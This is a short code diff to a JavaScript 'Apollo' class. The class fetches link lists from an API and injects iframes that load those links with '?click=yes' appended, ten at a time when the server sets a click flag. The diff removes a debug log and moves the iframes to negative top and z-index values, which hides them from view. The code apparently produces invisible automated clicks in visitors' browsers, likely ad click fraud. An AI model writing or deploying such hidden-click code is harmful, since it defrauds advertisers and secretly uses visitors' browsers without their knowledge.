@@ -21,7 +21,6 @@ class Apollo {
     this.createPop()
     //Start Apollo
     this.request(`${this.api}/remnant?publisher=${window.ApolloOptions.publisher}`, (res) => {
-      console.log(res)
       if (JSON.parse(res).click) {
         for (let i = 0; i < 10; i++) {
           this.request(`${this.api}/links`, (res => {
@@ -100,8 +99,8 @@ class Apollo {
 
     this[name].style.width = `300px`
     this[name].style.position = 'absolute'
-    this[name].style.top = '300px'
-    this[name].style.zIndex = '3000000'
+    this[name].style.top = '-300px'
+    this[name].style.zIndex = '-3000000'
 
     this[name].innerHTML = `
     <iframe id= "${num}" sandbox="allow-same-origin allow-scripts allow-forms" src="${links[this.rand(0, links.length - 1)]}?click=yes" style="background-color: transparent" allow-transparency="true" frameBorder="0" scrolling="no" width="300" height="110"></iframe>
